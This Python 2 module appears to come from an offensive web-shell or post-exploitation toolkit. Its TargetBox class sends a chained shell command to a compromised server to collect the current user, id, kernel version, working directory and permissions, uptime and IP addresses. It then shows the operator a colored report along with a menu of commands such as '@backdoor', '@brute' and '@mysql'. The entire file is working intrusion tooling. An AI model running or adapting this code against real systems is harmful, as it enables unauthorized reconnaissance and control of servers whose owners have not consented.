import datetime
from urllib2 import urlopen, URLError

from core.libs.menu import getargs
from core.libs.request_handler import make_request
from core.libs.thirdparty.termcolor import colored


class TargetBox(object):
    def __init__(self, url=None):
        self.url = url
        self.cmd = 'if [ `whoami 2> /dev/null|wc -l` -ge 1 ];then whoami;else echo "unkown" ;fi;'
        self.cmd += 'if [ `id 2> /dev/null|wc -l` -ge 1 ];then id;else echo "unknown" ;fi;'
        self.cmd += 'if [ `uname 2> /dev/null|wc -l` -ge 1 ];then uname -a;else echo "unknown" ;fi;'
        self.cmd += 'if [ `pwd 2> /dev/null|wc -l` -ge 1 ];then pwd;else echo "unknown" ;fi;'
        self.cmd += 'ls -ld `pwd` | awk \'{print $1}\';'
        self.cmd += 'bash -c "input=\$(uptime); if [[ \$input == *day* ]]; then out=\$(echo \$input | awk \'{print \$3\\" days\\"}\'); if [[ \$input == *min* ]]; then out=\$(echo \\"\$out and \\" && echo \$input | awk \'{print \$5\\" minutes\\"}\'); else out=\$(echo \\"\$out, \\" && echo \$input | awk \'{print \$5}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi elif [[ \$input == *min* ]]; then out=\$(echo \$input | awk \'{print \$3\\" minutes\\"}\'); else out=\$(echo \$input | awk \'{print \$3}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi; echo \$out;" ;'
        self.cmd += "/sbin/ifconfig | grep -e 'inet addr' | grep -v '127.0.0.1' | cut -f2 -d':' | cut -f1 -d' '"

        self.available_commands = ['@backdoor', '@download', '@enum', '@history', '@info', '@update', '@upload', '@brute', '@mysql', 'exit']

    def get_information(self):
        now = datetime.datetime.now()

        # Call get_page_source() method then assign it to self.source
        source = make_request.get_page_source(self.cmd)

        source = iter(source)
        self.current_user = next(source, "Unknown")
        self.current_id = next(source, "Unknown")
        self.kernel_info = next(source, "Unknown")
        self.cwd = next(source, "Unknown")
        self.perm_cwd = next(source, "Unknown")
        self.uptime = next(source, "Unknown")
        self.host_ip = next(source, "Unknow")
        self.session = now.strftime("%Y-%m-%d")
        if getargs.url:
            self.url = '/'.join(getargs.url.split('/', 3)[:3])
        else:
            self.url = "n/a"

        try:
            # Get the attacker's ip address (Thanks @mandreko)
            self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except (URLError, KeyboardInterrupt):
            self.local_ip = 'Unknown'

        self.info = '\t' + '-' * int(len(self.kernel_info) + 18) + '\n'
        self.info += colored("\tUser         : ", 'red') + colored(self.current_user, 'green') + '\n'
        self.info += colored("\tID           : ", 'red') + colored(self.current_id, 'green') + '\n'
        self.info += colored("\tKernel       : ", 'red') + colored(self.kernel_info, 'green') + '\n'
        self.info += colored("\tCWD          : ", 'red') + colored(self.cwd, 'green') + colored('\t\t' + self.perm_cwd, 'yellow', attrs=['bold']) + '\n'
        self.info += colored("\tUptime       : ", 'red') + colored(self.uptime, 'green') + '\n'
        self.info += colored("\tTarget's IPs : ", 'red') + colored(self.host_ip, 'green') + '\n'
        self.info += colored("\tOur IP       : ", 'red') + colored(self.local_ip, 'green') + '\n'
        self.info += '\t' + '-' * int(len(self.kernel_info) + 18)
        self.info += "\n\n"

        self.info += colored("\t[+] Available commands: " + ', '.join(self.available_commands), 'blue', attrs=['underline', 'bold']) + '\n'
        self.info += colored("\t[+] Inserting ! at the begining of the command will execute the command locally (on your box)", 'blue', attrs=['underline', 'bold'])
        self.info += "\n"
        return self.info

info = TargetBox()
